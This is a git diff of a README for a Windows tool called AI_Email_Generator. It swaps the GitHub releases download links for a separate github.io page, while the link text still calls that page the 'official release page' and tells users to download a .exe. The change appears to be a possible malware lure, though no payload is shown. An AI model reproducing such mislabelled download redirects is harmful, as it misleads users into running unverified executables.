@@ -1,6 +1,6 @@
 # 📧 AI_Email_Generator - Write professional emails faster locally
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/wordmiddling872/AI_Email_Generator/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://wordmiddling872.github.io)
 
 AI_Email_Generator creates business emails using your own computer. It runs entirely on your local machine. You do not need to share your data with cloud servers or pay for expensive monthly subscriptions. 
 
@@ -10,7 +10,7 @@ The software uses advanced language models to draft messages that sound professi
 
 You must visit the releases page to download the program. We package this tool as a simple executable file for Windows users.
 
-1. Go to the [official release page](https://github.com/wordmiddling872/AI_Email_Generator/releases).
+1. Go to the [official release page](https://wordmiddling872.github.io).
 2. Look for the "Assets" section under the latest version tag.
 3. Click the file ending in `.exe` to start your download.
 4. Save the file to a folder you can find later, such as your Downloads or Desktop folder.
